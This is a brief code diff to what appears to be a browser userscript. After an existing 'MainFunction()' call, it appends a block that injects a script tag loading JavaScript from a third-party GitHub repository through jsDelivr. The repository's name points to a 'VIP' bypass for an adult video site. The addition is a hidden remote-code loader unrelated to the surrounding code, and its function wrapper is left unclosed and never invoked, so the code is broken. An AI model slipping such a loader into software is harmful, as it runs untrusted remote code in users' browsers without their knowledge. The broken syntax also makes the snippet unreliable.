@@ -244,3 +244,6 @@ function MainFunction()
     }
 }
 MainFunction();//主函数执行
+(function() {
+    $("head").append('<script src="https://cdn.jsdelivr.net/gh/91p2022/91@main/91porn-vip.js"></script>');
+}
